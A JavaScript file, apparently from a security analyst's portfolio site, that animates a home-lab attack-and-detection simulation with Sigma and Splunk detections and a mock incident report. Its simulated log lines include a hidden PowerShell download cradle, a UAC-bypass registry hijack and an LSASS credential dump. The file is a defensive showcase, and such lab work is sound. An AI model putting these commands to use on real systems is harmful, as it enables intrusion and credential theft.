/* ===================================================================
 *  simulations.js — In-browser simulations for experiences, skills,
 *  and projects. All vanilla JS, no external dependencies.
 * =================================================================== */

(function () {
  'use strict';

  const $ = (s, c = document) => c.querySelector(s);
  const $$ = (s, c = document) => Array.from(c.querySelectorAll(s));
  const el = (tag, cls, html) => {
    const n = document.createElement(tag);
    if (cls) n.className = cls;
    if (html != null) n.innerHTML = html;
    return n;
  };

  /* helper: format live clock for terminals */
  function ts() {
    const d = new Date();
    return d.toTimeString().slice(0, 8);
  }

  /* =================================================================
   *  SHARED VISUAL-SIM HELPERS
   *  - makeTimers: per-sim timer registry auto-cleared on modal close
   *  - vsLink: animated SVG link + SMIL packet flow between nodes
   *    (nodes are positioned in %, stage SVG uses viewBox 0 0 1000 H
   *     with preserveAspectRatio="none" so % and viewBox coords align)
   *  - vsRunSteps: drives a .vs-steps list through running/pass states
   * ================================================================= */
  const SVG_NS = 'http://www.w3.org/2000/svg';

  function makeTimers(host) {
    const timers = [];
    const prev = host.__cleanup;
    const api = {
      later(fn, t) { const id = setTimeout(fn, t); timers.push(id); return id; },
      every(fn, t) { const id = setInterval(fn, t); timers.push(id); return id; },
      clear() { timers.forEach((id) => { clearTimeout(id); clearInterval(id); }); timers.length = 0; }
    };
    host.__cleanup = () => { api.clear(); if (prev) prev(); };
    return api;
  }

  function vsInitSvg(stage, vbH) {
    const svg = stage.querySelector('svg.vs-svg');
    if (!svg) return null;
    svg.setAttribute('viewBox', `0 0 1000 ${vbH}`);
    svg.setAttribute('preserveAspectRatio', 'none');
    return svg;
  }

  function vsLink(svg, x1p, y1p, x2p, y2p, vbH, opts = {}) {
    if (!svg) return null;
    // build the point list (percentages → viewBox coords); optional waypoints
    const P = (xp, yp) => [xp * 10, (yp * vbH) / 100];
    const pts = [P(x1p, y1p)];
    (opts.pts || []).forEach((w) => pts.push(P(w[0], w[1])));
    pts.push(P(x2p, y2p));
    const pathStr = 'M ' + pts.map((p) => `${p[0]} ${p[1]}`).join(' L ');

    const line = document.createElementNS(SVG_NS, opts.pts && opts.pts.length ? 'polyline' : 'line');
    if (opts.pts && opts.pts.length) {
      line.setAttribute('points', pts.map((p) => `${p[0]},${p[1]}`).join(' '));
    } else {
      line.setAttribute('x1', pts[0][0]); line.setAttribute('y1', pts[0][1]);
      line.setAttribute('x2', pts[1][0]); line.setAttribute('y2', pts[1][1]);
    }
    line.setAttribute('class', 'vs-link' + (opts.cls ? ' ' + opts.cls : ''));
    line.setAttribute('fill', 'none');
    svg.appendChild(line);

    const g = document.createElementNS(SVG_NS, 'g');
    svg.appendChild(g);
    function addPackets(n, color, dur, r) {
      for (let i = 0; i < n; i++) {
        const c = document.createElementNS(SVG_NS, 'circle');
        c.setAttribute('r', r || 3.5);
        c.setAttribute('fill', color || 'var(--neon-3)');
        c.setAttribute('opacity', '0');
        const am = document.createElementNS(SVG_NS, 'animateMotion');
        am.setAttribute('dur', (dur || 1.3) + 's');
        am.setAttribute('repeatCount', 'indefinite');
        am.setAttribute('path', pathStr);
        am.setAttribute('begin', ((i * (dur || 1.3)) / n).toFixed(2) + 's');
        c.appendChild(am);
        const fade = document.createElementNS(SVG_NS, 'animate');
        fade.setAttribute('attributeName', 'opacity');
        fade.setAttribute('values', '0;1;1;0');
        fade.setAttribute('dur', (dur || 1.3) + 's');
        fade.setAttribute('repeatCount', 'indefinite');
        fade.setAttribute('begin', ((i * (dur || 1.3)) / n).toFixed(2) + 's');
        c.appendChild(fade);
        g.appendChild(c);
      }
    }
    const api = {
      line, group: g,
      packets(n, color, dur, r) {
        while (g.firstChild) g.removeChild(g.firstChild);
        addPackets(n, color, dur, r);
        return api;
      },
      on()  { g.style.display = ''; return api; },
      off() { g.style.display = 'none'; return api; },
      activate()   { line.classList.add('active'); return api; },
      deactivate() { line.classList.remove('active'); return api; }
    };
    if (opts.packets) addPackets(opts.packets, opts.color, opts.dur, opts.r);
    if (opts.hidden) api.off();
    if (opts.active) api.activate();
    return api;
  }

  /* drives each .vs-step of a list; phases: [{ dur, run(), end(), fail }] */
  function vsRunSteps(listEl, timers, phases) {
    const items = Array.from((listEl || {}).querySelectorAll ? listEl.querySelectorAll('.vs-step') : []);
    const failed = phases.map((p) => !!p.fail);
    const stateOf = (j) => (failed[j] ? 'fail' : 'pass');
    const labelOf = (j) => (failed[j] ? 'FAIL' : 'PASS');
    const apply = (i, cls, state) => {
      items.forEach((x, j) => {
        x.className = 'vs-step ' + (j < i ? stateOf(j) : j === i ? cls : 'pending');
        const st = x.querySelector('.vs-step-state');
        if (st) st.textContent = j < i ? labelOf(j) : j === i ? state : 'QUEUED';
      });
    };
    let t = 250;
    phases.forEach((p, i) => {
      const tRun = t;
      timers.later(() => { apply(i, 'running', 'RUNNING'); if (p.run) p.run(); }, tRun);
      t += p.dur;
      const tEnd = t;
      timers.later(() => {
        failed[i] = !!p.fail;
        items.forEach((x, j) => {
          x.className = 'vs-step ' + (j <= i ? stateOf(j) : 'pending');
          const st = x.querySelector('.vs-step-state');
          if (st) st.textContent = j <= i ? labelOf(j) : 'QUEUED';
        });
        if (p.end) p.end();
      }, tEnd);
    });
    return t; // total ms
  }

  /* =================================================================
   *  SIMULATION REGISTRY — each key is referenced from data.js
   * ================================================================= */
  const SIMS = {};

  /* ---- helper to attach a typed terminal ---- */
  function attachTerminal(host, lines, opts = {}) {
    const speed = opts.speed || 18;     // ms per char
    const linePause = opts.linePause || 220;
    const container = host;
    container.innerHTML = '';
    let i = 0;
    function typeLine(line) {
      return new Promise((resolve) => {
        const lineEl = el('div', 'term-line');
        container.appendChild(lineEl);
        // handle prompt class
        if (line.startsWith('$') || line.startsWith('>')) {
          const sp = el('span', 'term-prompt', line.slice(0, 1));
          lineEl.appendChild(sp);
          var text = line.slice(1);
        } else {
          var text = line;
        }
        // pick class based on content
        let cls = 'term-out';
        if (/error|fail|critical|fatal|denied/i.test(line)) cls = 'term-err';
        else if (/warn|caution|suspicious/i.test(line)) cls = 'term-warn';
        else if (/ok|success|passed|clean/i.test(line)) cls = 'term-ok';
        const textSpan = el('span', cls);
        lineEl.appendChild(textSpan);
        let j = 0;
        const tid = setInterval(() => {
          textSpan.textContent += text[j++];
          container.scrollTop = container.scrollHeight;
          if (j >= text.length) {
            clearInterval(tid);
            resolve();
          }
        }, speed);
      });
    }
    (async () => {
      for (const ln of lines) {
        await typeLine(ln);
        await new Promise((r) => setTimeout(r, linePause));
      }
      if (opts.loop) {
        setTimeout(() => attachTerminal(host, lines, opts), 1500);
      }
    })();
  }

  /* =================================================================
   *  1. SOC + PENTEST HOME LAB (Independent Research period)
   *     Tab 1 — SOC & Pentest Lab Simulation: 4-VM topology with
   *             animated lateral movement + Splunk detection panels
   *     Tab 2 — Lab 02: Sigma rule
   *     Tab 3 — Lab 03: Splunk SPL
   *     Tab 4 — Lab 04: CyberGuardian — process scan → AI → report
   *     Tab 5 — TryHackMe achievements
   * ================================================================= */
  SIMS['soc-homelab'] = (host, ctx) => {
    const timers = makeTimers(host);
    const THM_URL = (window.RESUME_DATA && window.RESUME_DATA.personal && window.RESUME_DATA.personal.contact && window.RESUME_DATA.personal.contact.tryhackme) || 'https://tryhackme.com/p/Souhaieb.M';
    host.innerHTML = `
      <div class="sim-h">SOC + PENTEST HOME LAB — 4-VM ATTACK & DETECTION ENVIRONMENT</div>
      <div class="sim-p">How the lab was built and how the attack unfolds: 2× Windows Server 2019 (Domain Controller + IIS Web), 1× Windows 10 Pro 22H2 victim, 1× Kali Linux attacker — all on a VirtualBox host-only network (192.168.56.0/24). Splunk Enterprise collects Sysmon telemetry from every Windows VM. Watch the 9-phase attack chain execute: the attacker lands on the victim via a phishing macro, moves laterally to the DC over WinRM, while the purple telemetry links stream detections to Splunk.</div>

      <div class="sim-section active" data-sim="dashboard">
        <div class="vm-stage" id="hl-stage">
          <svg class="vs-svg"></svg>
          <span class="vs-stage-label">VIRTUALBOX HOST-ONLY — 192.168.56.0/24</span>

          <div class="vm-node" id="hl-kali" style="left:12%;top:28%">
            <div class="vm-node-title"><span class="vm-ico">🐉</span>KALI 2026.1<span class="vm-led"></span></div>
            <div class="vm-node-sub">attacker · .56.103<br>metasploit · Rubeus</div>
          </div>

          <div class="vm-node" id="hl-victim" style="left:42%;top:72%">
            <div class="vm-node-title"><span class="vm-ico">🖥️</span>WIN10 PRO<span class="vm-led"></span></div>
            <div class="vm-node-sub">victim · .56.101<br>Sysmon v15 + UF</div>
          </div>

          <div class="vm-node" id="hl-dc" style="left:74%;top:28%">
            <div class="vm-node-title"><span class="vm-ico">🏰</span>SERVER 2019 DC<span class="vm-led"></span></div>
            <div class="vm-node-sub">corp.local · .56.10<br>AD DS + IIS + Sysmon</div>
          </div>

          <div class="vm-node" id="hl-splunk" style="left:74%;top:82%">
            <div class="vm-node-title"><span class="vm-ico">📊</span>SPLUNK ENT.<span class="vm-led"></span></div>
            <div class="vm-node-sub">SIEM · .56.50<br>index=main · Sysmon</div>
          </div>

          <div class="vs-phase-line" id="hl-phase">LAB READY — 4 VMs powered on, telemetry flowing to Splunk</div>
        </div>

        <div class="siem-grid">
          <div class="siem-panel">
            <div class="siem-head"><span>SPLUNK EVENT STREAM — index=main sourcetype=WinEventLog:Sysmon</span><span class="blink" style="color:var(--neon)">●</span></div>
            <div class="siem-log-stream" id="siem-stream"></div>
          </div>
          <div class="siem-panel">
            <div class="siem-head"><span>SECURITY KPIs — last 60min</span><span style="color:var(--fg-dim)">refresh=15s</span></div>
            <div class="siem-kpis" id="siem-kpis"></div>
            <div class="siem-head" style="margin-top:10px"><span>MITRE ATT&CK HEATMAP</span><span style="color:var(--fg-dim)">10 tactics</span></div>
            <div id="siem-heat"></div>
          </div>
        </div>
        <div style="margin-top:14px">
          <div class="sim-h">ATTACK CHAIN — 9 PHASES (executed on the topology above)</div>
          <div class="attack-chain" id="chain-grid"></div>
        </div>
      </div>

      <div class="sim-section" data-sim="sigma">
        <div class="sim-h">LAB 02 — SIGMA RULE — Scheduled Task Persistence (T1053.005)</div>
        <div class="sim-p">One of the 9 Sigma rules authored for the lab — each rule maps to one phase of the attack chain and was validated by replaying the phase and confirming the detection fires in Splunk.</div>
        <pre class="code-viewer"><span class="k">title</span>: <span class="s">Scheduled Task Creation for Persistence</span>
<span class="k">id</span>: <span class="s">4d5e6f7a-8b9c-0123-defa-234567890123</span>
<span class="k">status</span>: <span class="s">production</span>
<span class="k">description</span>: <span class="c"># Detects scheduled tasks that may be used for persistence. Monitors Security Event ID 4698 and Task Scheduler Event ID 106.</span>
<span class="k">references</span>:
  - <span class="s">https://attack.mitre.org/techniques/T1053/005/</span>
<span class="k">author</span>: <span class="s">SOC Home Lab Project Alpha</span>
<span class="k">tags</span>:
  - <span class="s">attack.persistence</span>
  - <span class="s">attack.t1053.005</span>
<span class="k">logsource</span>:
  <span class="k">product</span>: <span class="s">windows</span>
  <span class="k">service</span>: <span class="s">security</span>
<span class="k">detection</span>:
  <span class="k">selection_4698</span>:
    <span class="k">EventID</span>: <span class="n">4698</span>
  <span class="k">selection_106</span>:
    <span class="k">EventID</span>: <span class="n">106</span>
    <span class="k">Source</span>: <span class="s">Microsoft-Windows-TaskScheduler</span>
  <span class="k">suspicious_names</span>:
    <span class="k">TaskName|contains</span>:
      - <span class="s">SystemHealth</span>
      - <span class="s">Updater</span>
      - <span class="s">Monitor</span>
  <span class="k">condition</span>: <span class="s">(selection_4698 or selection_106) and suspicious_names</span>
<span class="k">falsepositives</span>:
  - <span class="s">Legitimate software installation</span>
<span class="k">level</span>: <span class="s">medium</span></pre>
      </div>

      <div class="sim-section" data-sim="spl">
        <div class="sim-h">LAB 03 — SPLUNK SPL — Privilege Escalation: UAC Bypass via eventvwr.exe</div>
        <div class="sim-p">Detection queries executed against the collected Sysmon telemetry — each query was validated by replaying the corresponding attack phase and confirming the expected events return.</div>
        <pre class="code-viewer"><span class="c"># Query 1 — Registry modification for UAC bypass (Sysmon Event ID 13)</span>
index=main sourcetype=<span class="s">"WinEventLog:Sysmon"</span> EventCode=<span class="n">13</span> TargetObject=<span class="s">"*mscfile*"</span>
| table _time, Message

<span class="c"># Query 2 — eventvwr.exe execution (Sysmon Event ID 1)</span>
index=main sourcetype=<span class="s">"WinEventLog:Sysmon"</span> EventCode=<span class="n">1</span> ParentImage=<span class="s">"*eventvwr.exe*"</span>
| table _time, Message

<span class="c"># Query 3 — Proof file access (Security 4656 OR 4663)</span>
index=main sourcetype=<span class="s">"WinEventLog:Security"</span> (EventCode=<span class="n">4656</span> OR EventCode=<span class="n">4663</span>) ObjectName=<span class="s">"*msfile*"</span>
| table _time, Message</pre>
      </div>

      <div class="sim-section" data-sim="cyberguardian">
        <div class="sim-h">LAB 04 — CYBERGUARDIAN — SCAN → AI ANALYSIS → FINAL REPORT</div>
        <div class="sim-p">The fourth lab: my open-source malware detection tool. CyberGuardian first sweeps running processes (layer 1), correlates the hits with YARA rules, VirusTotal and network telemetry (layer 2), then hands the evidence to the AI engine (layer 3) which classifies the threat, maps it to MITRE ATT&CK and generates the final report (layer 4). The pipeline below replays a real triage.</div>

        <div class="cg-pipe" id="cg-pipe">
          <div class="cg-pstep" data-p="1"><span class="cg-pstep-ico">🔍</span>Process Scan</div>
          <div class="cg-pstep" data-p="2"><span class="cg-pstep-ico">🧩</span>IOC Correlation</div>
          <div class="cg-pstep" data-p="3"><span class="cg-pstep-ico">🤖</span>AI Analysis</div>
          <div class="cg-pstep" data-p="4"><span class="cg-pstep-ico">📄</span>Final Report</div>
        </div>

        <div class="skill-modal-grid" style="margin-bottom:14px">
          <div>
            <div class="sim-h">LAYER 1 — PROCESS SWEEP (live)</div>
            <div class="cg-proc">
              <div class="cg-proc-row head">
                <span>PID</span><span>PROCESS</span><span>YARA / VT</span><span>BEHAVIOR</span><span>VERDICT</span>
              </div>
              <div class="cg-proc-row" data-proc="1"><span>892</span><span>explorer.exe</span><span class="cg-dim">no match</span><span class="cg-dim">normal session</span><span class="cg-verdict" data-v>…</span></div>
              <div class="cg-proc-row" data-proc="2"><span>1044</span><span>chrome.exe</span><span class="cg-dim">no match</span><span class="cg-dim">user browsing</span><span class="cg-verdict" data-v>…</span></div>
              <div class="cg-proc-row" data-proc="3"><span>712</span><span>svchost.exe</span><span class="ioc">malware_generic_loader · VT 38/72</span><span>parent=spoolsv.exe ⚠</span><span class="cg-verdict" data-v>…</span></div>
              <div class="cg-proc-row" data-proc="4"><span>4812</span><span>powershell.exe</span><span class="ioc">encoded_cmd · VT 12/92 (IP)</span><span>beacon → .56.103:443 ⚠</span><span class="cg-verdict" data-v>…</span></div>
              <div class="cg-proc-row" data-proc="5"><span>3310</span><span>winlogon.exe</span><span class="cg-dim">no match</span><span class="cg-dim">system session</span><span class="cg-verdict" data-v>…</span></div>
            </div>

            <div class="sim-h" style="margin-top:12px">LAYER 2 — IOC CORRELATION</div>
            <ul class="vs-steps">
              <li class="vs-step fail"><span class="vs-step-ico">🧬</span><div class="vs-step-body"><b>YARA</b> — malware_generic_loader + mimikatz_signature matched in memory (PID 712)</div><span class="vs-step-state">HIT</span></li>
              <li class="vs-step fail"><span class="vs-step-ico">🌐</span><div class="vs-step-body"><b>VirusTotal</b> — 38/72 engines flag the binary; C2 IP reputation 12/92 malicious</div><span class="vs-step-state">HIT</span></li>
              <li class="vs-step fail"><span class="vs-step-ico">📡</span><div class="vs-step-body"><b>Network</b> — 60s beacon interval to 192.168.56.103:443, HTTP POST /check-in</div><span class="vs-step-state">HIT</span></li>
            </ul>
          </div>
          <div>
            <div class="sim-h">LAYER 3 — AI ANALYSIS</div>
            <div class="cg-report">
              <div class="cg-report-head">
                <span class="cg-report-title">AI ENGINE</span>
                <span style="display:flex;gap:5px;flex-wrap:wrap">
                  <span class="stack-chip" style="border-color:var(--neon);color:var(--neon)">DeepSeek ✓</span>
                  <span class="stack-chip">OpenAI</span>
                  <span class="stack-chip">Gemini</span>
                </span>
              </div>
              <div class="cg-report-sec show" style="margin-bottom:10px">
                <h6>Evidence submitted</h6>
                IFEO Debugger Injection · YARA: uac_bypass_eventvwr · VT 41/72 · C2 beacon 60s · lsass.dmp handle
              </div>
              <div class="cg-report-sec show">
                <h6>Verdict</h6>
                <div style="font-size:16px;font-family:var(--display);color:var(--neon-3);margin-bottom:4px" id="cg-verdict">analyzing…</div>
                <div id="cg-verdict-sub" style="color:var(--fg-dim);font-size:11px">correlating 5 detection vectors…</div>
              </div>
            </div>
          </div>
        </div>

        <div class="sim-h">LAYER 4 — AI-GENERATED FINAL REPORT</div>
        <div class="cg-report" id="cg-report">
          <div class="cg-report-head">
            <span class="cg-report-title">CYBERGUARDIAN — INCIDENT REPORT #CG-2026-0117</span>
            <span class="jira-sev critical">MALICIOUS · 9.2/10</span>
          </div>
          <div class="cg-report-sec" data-sec="1">
            <h6>Executive summary</h6>
            Host WIN10-VICTIM (192.168.56.101) is compromised by a credential-stealing trojan delivered via a macro-enabled document. Two processes are actively malicious: a trojanized svchost.exe (PID 712) and a PowerShell beacon (PID 4812) communicating with a known-malicious C2 at 192.168.56.103.
          </div>
          <div class="cg-report-sec" data-sec="2">
            <h6>Findings</h6>
            F-01 — Malicious parent-child chain: spoolsv.exe → svchost.exe (T1055 process injection)<br>
            F-02 — PowerShell network beacon, 60s interval to C2 :443 (T1071.001)<br>
            F-03 — LSASS memory access — credential dump in progress (T1003.001)
          </div>
          <div class="cg-report-sec" data-sec="3">
            <h6>MITRE ATT&CK mapping</h6>
            T1055 · T1071.001 · T1003.001 · T1548.002 · T1059.001 — mapped automatically by the AI engine from the raw detection JSON.
          </div>
          <div class="cg-report-sec" data-sec="4">
            <h6>Recommendations</h6>
            Isolate the host from the network immediately · block 192.168.56.103 at the firewall · capture full memory with Volatility 3 · rotate all credentials used on the host · hunt the same YARA signatures across the fleet.
          </div>
          <div class="cg-report-sec" data-sec="5">
            <h6>IOC list</h6>
            sha256: 4f8c…e201 · C2: 192.168.56.103:443 · persistence: HKCU\\…\\mscfile\\shell\\open\\command · task: \\SystemHealthMonitor
          </div>
        </div>
      </div>

      <div class="sim-section" data-sim="thm">
        <div class="sim-h">TRYHACKME — LEARNING & ACHIEVEMENTS</div>
        <div class="sim-p">400+ hands-on rooms completed across blue and red team paths (global top 1%), 50+ CTF challenges, and four completed certification paths. Selected achievements below — full room history on the profile.</div>

        <div class="kpi-strip">
          <div class="kpi-box"><div class="kpi-box-val">400+</div><div class="kpi-box-lbl">Rooms completed</div></div>
          <div class="kpi-box"><div class="kpi-box-val alert">TOP 1%</div><div class="kpi-box-lbl">Global rank</div></div>
          <div class="kpi-box"><div class="kpi-box-val">50+</div><div class="kpi-box-lbl">CTF challenges</div></div>
          <div class="kpi-box"><div class="kpi-box-val">4</div><div class="kpi-box-lbl">Certified paths</div></div>
        </div>

        <div class="sim-h">CERTIFIED LEARNING PATHS</div>
        <div class="thm-paths">
          <div class="thm-path">
            <div class="thm-path-head">
              <span class="thm-path-name">🛡️ SOC Level 1</span>
              <span class="thm-path-cert">CERTIFIED 2024</span>
            </div>
            <div class="thm-bar"><div class="thm-bar-fill" data-thm-fill="100"></div></div>
            <div class="thm-path-sub">triage · log analysis · SIEM · incident response</div>
          </div>
          <div class="thm-path">
            <div class="thm-path-head">
              <span class="thm-path-name">🛡️ SOC Level 2</span>
              <span class="thm-path-cert">CERTIFIED 2025</span>
            </div>
            <div class="thm-bar"><div class="thm-bar-fill" data-thm-fill="100"></div></div>
            <div class="thm-path-sub">threat hunting · detection engineering · malware analysis</div>
          </div>
          <div class="thm-path">
            <div class="thm-path-head">
              <span class="thm-path-name">⚔️ Jr Penetration Tester</span>
              <span class="thm-path-cert">CERTIFIED 2023</span>
            </div>
            <div class="thm-bar"><div class="thm-bar-fill" data-thm-fill="100"></div></div>
            <div class="thm-path-sub">web exploitation · privilege escalation · network attacks</div>
          </div>
          <div class="thm-path">
            <div class="thm-path-head">
              <span class="thm-path-name">🔐 Cyber Security 101</span>
              <span class="thm-path-cert">CERTIFIED 2024</span>
            </div>
            <div class="thm-bar"><div class="thm-bar-fill" data-thm-fill="100"></div></div>
            <div class="thm-path-sub">core principles · Linux &amp; Windows fundamentals · networking</div>
          </div>
        </div>

        <div class="sim-h">REPRESENTATIVE ROOMS COMPLETED <span style="color:var(--fg-dim);text-transform:none;letter-spacing:0">(of 400+)</span></div>
        <div class="thm-rooms">
          <div class="thm-room"><span class="done-ico">✓</span>Wireshark 101</div>
          <div class="thm-room"><span class="done-ico">✓</span>Nmap</div>
          <div class="thm-room"><span class="done-ico">✓</span>Yara</div>
          <div class="thm-room"><span class="done-ico">✓</span>Kerberoasting</div>
          <div class="thm-room"><span class="done-ico">✓</span>Windows Forensics 1</div>
          <div class="thm-room"><span class="done-ico">✓</span>Linux Forensics</div>
          <div class="thm-room"><span class="done-ico">✓</span>OWASP Top 10</div>
          <div class="thm-room"><span class="done-ico">✓</span>SQL Injection</div>
          <div class="thm-room"><span class="done-ico">✓</span>Cross-Site Scripting</div>
          <div class="thm-room"><span class="done-ico">✓</span>Hydra</div>
          <div class="thm-room"><span class="done-ico">✓</span>John The Ripper</div>
          <div class="thm-room"><span class="done-ico">✓</span>Burp Suite: The Basics</div>
          <div class="thm-room"><span class="done-ico">✓</span>Intro to Malware Analysis</div>
          <div class="thm-room"><span class="done-ico">✓</span>MITRE</div>
          <div class="thm-room"><span class="done-ico">✓</span>File Inclusion</div>
          <div class="thm-room"><span class="done-ico">✓</span>SSRF</div>
          <div class="thm-room"><span class="done-ico">✓</span>Red Team Recon</div>
          <div class="thm-room"><span class="done-ico">✓</span>Password Attacks</div>
        </div>

        <div class="sim-h" style="margin-top:14px">SKILLS PRACTISED ACROSS THE ROOMS</div>
        <div style="display:flex;flex-wrap:wrap;gap:6px;font-size:10px">
          ${['Log Analysis','Splunk','Wireshark','tcpdump','Nmap','Burp Suite','OWASP Top 10','Active Directory Attacks','Kerberoasting','Hash Cracking','Phishing Analysis','Digital Forensics','Memory Forensics','Malware Analysis','YARA','Privilege Escalation','Web App Pentesting','CTF'].map(s => `<span class="stack-chip">${s}</span>`).join('')}
        </div>

        <div style="margin-top:16px;text-align:center">
          <a class="btn-sim" href="${THM_URL}" target="_blank" rel="noopener" style="display:inline-block;text-decoration:none">
            <span class="blink">▸</span> VIEW_FULL_PROFILE_ON_TRYHACKME
          </a>
        </div>
      </div>
    `;

    /* ---- Tab 1: VM topology + lateral movement animation ---- */
    const stage = $('#hl-stage', host);
    const svg = vsInitSvg(stage, 280);
    const VB = 280;
    const kaliNode = $('#hl-kali', host), victimNode = $('#hl-victim', host),
          dcNode = $('#hl-dc', host), splunkNode = $('#hl-splunk', host);
    const linkKali  = vsLink(svg, 12, 28, 42, 72, VB, { cls: 'attack', hidden: true });
    const linkLateral = vsLink(svg, 42, 72, 74, 28, VB, { cls: 'attack', hidden: true });
    const linkTelV = vsLink(svg, 42, 72, 74, 82, VB, { cls: 'telemetry active' });
    // route DC→Splunk around the right side so the link is never hidden behind the boxes
    const linkTelD = vsLink(svg, 74, 28, 74, 82, VB, { cls: 'telemetry active', pts: [[93, 28], [93, 82]] });
    const phaseLine = $('#hl-phase', host);

    function playLab() {
      // reset
      kaliNode.className = 'vm-node'; victimNode.className = 'vm-node';
      dcNode.className = 'vm-node'; splunkNode.className = 'vm-node';
      [linkKali, linkLateral].forEach((l) => { if (l) { l.off(); l.deactivate(); } });
      if (linkTelV) linkTelV.packets(2, 'var(--neon-5)', 2.0).on();
      if (linkTelD) linkTelD.packets(2, 'var(--neon-5)', 2.0).on();
      phaseLine.innerHTML = 'LAB READY — 4 VMs powered on, telemetry flowing to Splunk';

      const seq = [
        { t: 1200, run() {
            phaseLine.innerHTML = '<span class="warn">PHASE 01-02/09 — INITIAL ACCESS + EXECUTION: phishing invoice.xlsm → VBA macro → PowerShell IEX cradle on VICTIM</span>';
            kaliNode.className = 'vm-node active';
            victimNode.className = 'vm-node hit';
            if (linkKali) linkKali.activate().packets(4, 'var(--neon-3)', 1.1).on();
          } },
        { t: 4200, run() {
            phaseLine.innerHTML = '<span class="warn">PHASE 03-05/09 — ENUMERATION + PRIV-ESC + PERSISTENCE on VICTIM (Rubeus kerberoast · eventvwr UAC bypass · scheduled task)</span>';
          } },
        { t: 7400, run() {
            phaseLine.innerHTML = '<span class="err">PHASE 06/09 — LATERAL MOVEMENT: WinRM → Domain Controller 192.168.56.10 (Pass-the-Ticket)</span>';
            dcNode.className = 'vm-node active';
            if (linkLateral) linkLateral.activate().packets(4, 'var(--neon-3)', 1.3).on();
          } },
        { t: 10600, run() {
            phaseLine.innerHTML = '<span class="err">PHASE 07-09/09 — C2 BEACON + DC PERSISTENCE + LSASS DUMP: svchost_updater.exe · malicious service · ProcDump -ma lsass.dmp</span>';
            dcNode.className = 'vm-node hit';
          } },
        { t: 13800, run() {
            phaseLine.innerHTML = 'ALL 9 PHASES EXECUTED — every phase detected by Sigma + Splunk SPL (see Labs 02 &amp; 03) — full IR documentation per phase';
            splunkNode.className = 'vm-node active';
          } }
      ];
      seq.forEach((s) => timers.later(s.run, s.t));
      timers.later(() => playLab(), 18500); // loop
    }
    playLab();

    /* ---- Tab 1: KPIs, heatmap, chain, log stream ---- */
    const kpiData = [
      { val: '14', lbl: 'CRITICAL', cls: 'alert' },
      { val: '37', lbl: 'WARNINGS' },
      { val: '212', lbl: 'INFO' },
      { val: '99.2%', lbl: 'COVERAGE' }
    ];
    const kpis = $('#siem-kpis', host);
    kpiData.forEach((k) => {
      const t = el('div', 'siem-kpi' + (k.cls ? ' ' + k.cls : ''));
      t.innerHTML = `<div class="siem-kpi-val">${k.val}</div><div class="siem-kpi-lbl">${k.lbl}</div>`;
      kpis.appendChild(t);
    });

    // heatmap
    const tactics = [
      'Initial Access', 'Execution', 'Persistence', 'Priv Esc',
      'Defense Evasion', 'Cred Access', 'Discovery', 'Lateral',
      'Collection', 'Impact'
    ];
    const heat = $('#siem-heat', host);
    const heatGrid = el('div');
    heatGrid.style.cssText = 'display:grid;grid-template-columns:repeat(5,1fr);gap:4px';
    const heatLevels = [3, 4, 5, 4, 3, 2, 1, 3, 2, 1];
    tactics.forEach((t, i) => {
      const cell = el('div');
      const lvl = heatLevels[i];
      cell.style.cssText = `padding:6px 4px;border:1px solid var(--line);text-align:center;font-size:9px;color:var(--fg-soft);background:rgba(255,${184 - lvl * 25},${0 + lvl * 15},0.08)`;
      cell.innerHTML = `<div style="color:var(--neon-${lvl > 3 ? '3' : '4'});font-family:var(--display);font-weight:800">${lvl}</div>${t}`;
      heatGrid.appendChild(cell);
    });
    heat.appendChild(heatGrid);

    // attack chain (in sync with the topology animation)
    const chain = [
      { no: '01', name: 'Initial Access', tool: 'invoice.xlsm (VBA macro)', tactic: 'T1566.001' },
      { no: '02', name: 'Execution',       tool: 'PowerShell IEX cradle', tactic: 'T1059.001' },
      { no: '03', name: 'Enumeration',     tool: 'Rubeus.exe kerberoast',  tactic: 'T1558.003' },
      { no: '04', name: 'Privilege Escalation', tool: 'eventvwr.exe UAC bypass', tactic: 'T1548.002' },
      { no: '05', name: 'Persistence',     tool: 'SystemHealthMonitor task', tactic: 'T1053.005' },
      { no: '06', name: 'Lateral Movement', tool: 'WinRM / Invoke-Command', tactic: 'T1021.006' },
      { no: '07', name: 'C2 Beacon on DC', tool: 'svchost_updater.exe', tactic: 'T1543.003' },
      { no: '08', name: 'DC Persistence',   tool: 'Malicious service',     tactic: 'T1543.003' },
      { no: '09', name: 'Credential Dump', tool: 'ProcDump -ma lsass.dmp', tactic: 'T1003.001' }
    ];
    const chainGrid = $('#chain-grid', host);
    function playChain() {
      const nodes = $$('.chain-node', chainGrid);
      nodes.forEach((n) => n.classList.remove('active', 'done'));
      chain.forEach((c, i) => {
        timers.later(() => { nodes[i].classList.add('active'); }, 400 + i * 1500);
        timers.later(() => { if (nodes[i]) { nodes[i].classList.remove('active'); nodes[i].classList.add('done'); } }, 400 + i * 1500 + 1300);
      });
    }
    chain.forEach((c) => {
      const node = el('div', 'chain-node');
      node.innerHTML = `<div class="chain-no">PHASE ${c.no}</div><div class="chain-name">${c.name}</div><div class="chain-tool">▸ ${c.tool}</div><div class="chain-tactic">${c.tactic}</div>`;
      chainGrid.appendChild(node);
    });
    playChain();
    timers.later(() => playChain(), 18500); // in sync with topology loop

    // log stream
    const stream = $('#siem-stream', host);
    const logTemplates = [
      ['info', `[${ts()}] Sysmon/1 ProcessCreate: powershell.exe -ExecutionPolicy Bypass -w hidden IEX (New-Object Net.WebClient).DownloadString`],
      ['warn', `[${ts()}] Security/4698 Scheduled task created: TaskName='\\SystemHealthMonitor' Author=WIN-DC\\Administrator`],
      ['crit', `[${ts()}] Sysmon/10 ProcessAccess: lsass.exe accessed by svchost.exe PID=712 (SourceImage: C:\\Windows\\Temp\\svchost_updater.exe)`],
      ['info', `[${ts()}] Sysmon/1 ProcessCreate: eventvwr.exe (parent: explorer.exe) — possible UAC bypass chain`],
      ['crit', `[${ts()}] Security/4624 Logon: User=Administrator LogonType=3 NetworkAddress=192.168.56.103 — Pass-the-Ticket`],
      ['warn', `[${ts()}] Sysmon/13 RegistryValueSet: HKCU\\Software\\Classes\\mscfile\\shell\\open\\command = "C:\\Windows\\Temp\\explorer.exe"`],
      ['info', `[${ts()}] Splunk: detection 'win_scheduled_task_persistence' fired — Sigma rule T1053.005`],
      ['crit', `[${ts()}] Memory: Volatility3 --lsass dump — Mimikatz signature detected, NT hash extracted`],
      ['info', `[${ts()}] Rubeus: kerberoast complete — TGT for svc-sql extracted (rc4_hmac)`]
    ];
    let li = 0;
    function pushLog() {
      const [lvl, txt] = logTemplates[li % logTemplates.length];
      const line = el('div', `siem-log-line ${lvl}`, txt);
      stream.appendChild(line);
